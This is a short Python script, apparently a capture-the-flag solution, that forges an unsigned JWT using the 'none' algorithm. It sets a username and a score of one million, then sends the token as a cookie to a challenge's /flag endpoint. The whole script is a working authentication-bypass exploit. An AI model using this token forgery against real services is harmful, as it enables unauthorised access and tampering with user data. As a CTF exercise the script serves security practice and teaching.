import jwt
from datetime import datetime, timedelta, timezone
import requests 
import sys

# Get the challenge URL and the username 
if len(sys.argv) != 3:
	print('Usage: solution.py <challenge-url> <username>')
url = sys.argv[1] + "/flag"
username = sys.argv[2]

# The expiration and creation time for JWT 
time_exp = datetime.now(tz=timezone.utc) + timedelta(hours=1)
time_now = datetime.now(tz=timezone.utc)

# Set the score to 1 million 
score = 1000000

# Create the None Algo JWT
payload = {"sub": username,
"score": score,
"exp": time_exp,
"iat": time_now
}
jwt_token = jwt.encode(payload, None, "none")

cookies = dict(token=jwt_token)
r = requests.get(url, cookies=cookies)
print(r.text)